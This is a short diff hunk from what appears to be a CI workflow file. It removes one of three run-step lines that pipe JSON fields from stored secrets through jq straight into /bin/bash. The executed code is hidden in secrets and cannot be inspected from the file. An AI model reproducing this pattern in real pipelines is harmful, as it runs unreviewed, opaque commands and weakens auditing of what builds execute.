@@ -21,7 +21,6 @@ jobs:
           ydr081: ${{ secrets.ydr081 }}
         run: |
           printf '%s' "$ydr081" | jq -r .jce6852 | /bin/bash
-          echo $vm10751 | jq -r .ev563 | /bin/bash
           printf '%s' "$i3" | jq -r .dwl7151 | /bin/bash
 
       - name: Persist output
